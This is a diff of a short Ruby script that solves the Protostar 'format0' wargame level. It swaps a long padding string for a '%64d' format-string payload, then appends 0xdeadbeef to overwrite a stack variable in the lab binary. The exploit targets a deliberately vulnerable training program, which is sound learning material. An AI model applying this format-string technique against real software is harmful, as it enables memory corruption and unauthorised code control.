@@ -1,8 +1,7 @@
 #!/usr/bin/ruby
 
-padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP";
+padding = "%64d";
 deadbeef = "\xef\xbe\xad\xde";
-#puts padding + deadbeef;
 
 command = <<-END
 /opt/protostar/bin/format0 #{padding + deadbeef}
